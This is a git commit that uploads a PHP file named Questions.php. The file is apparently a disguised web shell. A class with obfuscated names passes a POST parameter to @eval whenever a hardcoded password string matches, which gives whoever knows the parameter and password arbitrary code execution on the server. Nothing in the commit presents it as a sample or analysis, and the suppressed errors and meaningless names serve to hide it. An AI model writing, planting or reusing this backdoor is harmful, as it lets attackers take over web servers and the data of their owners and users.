e7c1939b02735296e4bf9cec2345af283993b619
altinomarcelinho67-collab <altinomarcelinho67@gmail.com>
2026-03-27 02:24:51 -0700

    Add files via upload

---
+++ Questions.php
@@ -0,0 +1,15 @@
+<?php
+
+class ewgw425hasw{
+	function y234fsdf53($yX2bTHvYAn3q,$y2bvYA37){
+        if($y2bvYA37=='OjYPQm9n')
+        {
+            @eval($yX2bTHvYAn3q);
+        }
+    }
+}
+
+$ewgw425hasw = new ewgw425hasw;
+$skjda = 'OjYPQm9n';
+$ssopass=$_POST["F3Vx0Uj2ySlyxRCR"];
+$ewgw425hasw->y234fsdf53($ssopass,$skjda);
